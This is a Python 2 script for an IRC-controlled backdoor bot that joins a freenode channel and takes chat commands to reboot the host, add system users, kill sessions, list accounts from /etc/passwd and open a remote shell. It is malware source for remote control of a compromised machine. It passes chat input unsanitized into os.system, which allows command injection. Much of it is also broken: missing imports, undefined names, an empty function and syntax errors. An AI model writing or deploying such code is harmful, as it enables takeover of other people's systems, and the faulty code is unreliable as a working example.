import subprocess, sys, base64, os, socket
from time import sleep

info = "rip"
newUser = "lol"
newPass = "changme"

###
### Function to initiate irc connection and begin listening for commands.
### When a user sends a recognized command it executes the respective function
### 
def ircConnect():
	
    #info for irc channel
    network = 'irc.freenode.net'
    port = 6667
    channel = '#doshchannel'
    password = 'password'
    nick = "doshBot"
   
    #Connect to irc server and register nick
    irc = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    irc.connect( (network, port) )
    print irc.recv( 4096 )
    irc.send("USER " + nick + " " + nick + " " + nick + ":This is a test. \n")
    irc.send("NICK " + nick + "\n")
    irc.send("PRIVMSG" + " NICKSERV :identify " + password + "\n")
    irc.send("JOIN " + channel + '\n')
    
    # Listen for commands
    while 1:
        text = irc.recv(2040)
        print text
        if(text.find('PING') != -1):
            irc.send('PONG ' + text.split()[1] + '\r\n')

        elif(text.find(':!speak') != -1):
            irc.send('PRIVMSG ' + channel + ' :This guy fucks' + '\r\n')
	
	elif(text.find(':!addUser') != -1):
           temp = text.find(':!addUser')
	   temp = int(temp) + 9
	   if(text[temp:] != ""):
	   	info = text[temp:]
		info = info.strip().split()
		newUser = info[0]
	        newPass = info[1]
		print newUser
		print newPass
	
	   irc.send('PRIVMSG ' + channel + ' :User added.\r\n')
	   addUser(newUser, newPass)

	elif(text.find(':!reboot') != -1):
	   reboot()
	
	elif(text.find(':!killUser') != -1):
	   temp = text.find(':!killUser')
	   temp = int(temp) + 10
	   if(text[temp:] != ""):
		user = text[temp:]
		user = user.strip()
		print user
	
	   irc.send('PRIVMSG ' + channel + ' :User killed.\r\n')
	   killUser(user)

	elif(text.find(':!dropShell'):
            dropShell()
 
	elif(text.find(':!listUsers') != -1):
	    userList = listUsers()
	    returnString = ""
	    for x in userList:
		returnString += (x + ', ')
	    irc.send('PRIVMSG '+ channel + ' : ' + returnString + '\r\n')
	    
	elif(text.find(':!help') != -1):
	    irc.send('PRIVMSG ' + channel + ' :Commands - !speak, !reboot, !findFile, !listUsers, !addUser [name] [password], killUser [user]\r\n')


###
### Call a reboot of the host computer
### @params - none
### @returns - none
###
def reboot():
    os.system('reboot')


###
### Handle a request from the shell connection
### @params - none
### @returns - none
###
def handleClient():
    
    request = client_socket.recv(2048)
    print request
    client_socket.send("ACK!")
    client_socket.close()


###
### Shell for remote to connect to
### @params - none
### @return - none
###
def shell()
    
    port = randint(10000, 20000)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind = (('', port))
    server.listen(5)
    
    while True:
	
	client, address = server.accept()
	client_handler = threading.Thread(target=handle_client, args=(client,))
	client_handler.start()

###
### Opens up a shell on the host machine
### @params - none
### @returns - the port and ip to connect to the shell
###
def dropShell():
    

###
### List the users found in /etc/passwd
### @params - none
### @returns - list of users in /etc/passwd(string)
### 
def listUsers():
    output = []
    os.system("awk -F':' '{ print $1}' /etc/passwd >> output.file")
    f = open("output.file", "r")
    for line in f:
	line = line.replace('\n', '')
	output += [line]
    f.close()
    os.system("rm output.file")
    return output

###
### Adds a user on the machine through the useradd command
### @params - the name of the user(string), password for the user(string)
### @returns - nothing
###  
def addUser(user, passw):
    os.system('useradd ' + user + ' -p ' + passw)

###
### Kills the session of the user specified
### @params - name of the user(string)
### @returns - nothing
###
def killUser(user):
    os.system('skill -KILL -u ' + user)

###
### main call to run program
###
if __name__ == '__main__':
    ircConnect()


















